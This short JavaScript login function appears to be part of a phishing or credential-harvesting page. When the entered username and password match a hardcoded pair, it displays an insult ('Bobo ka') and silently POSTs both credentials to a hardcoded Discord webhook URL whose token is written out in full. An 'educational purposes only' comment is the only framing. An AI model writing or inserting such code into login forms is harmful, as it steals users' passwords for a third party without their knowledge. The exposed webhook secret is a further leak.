function login() {
  var username = document.getElementById("username").value;
  var password = document.getElementById("password").value;

  // Simulate authentication (replace with server-side validation)
  if (username === "example" && password === "password") {
    document.getElementById("loginResult").innerText = "Bobo ka";

    // Send credentials to Discord webhook (for educational purposes only)
    var webhookURL = 'https://discord.com/api/webhooks/1185863103775252480/bzabXg7vFY7E5OdOh5Pw8UyLn5h4sUNUkJ3vyZhzNPSTWv2bV-0A6-cW3tmfmXPelnX-';
    var payload = { username: username, password: password };

    // Make a simple POST request to the Discord webhook
    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });

  } else {
    document.getElementById("loginResult").innerText = "Invalid username or password";
  }
}
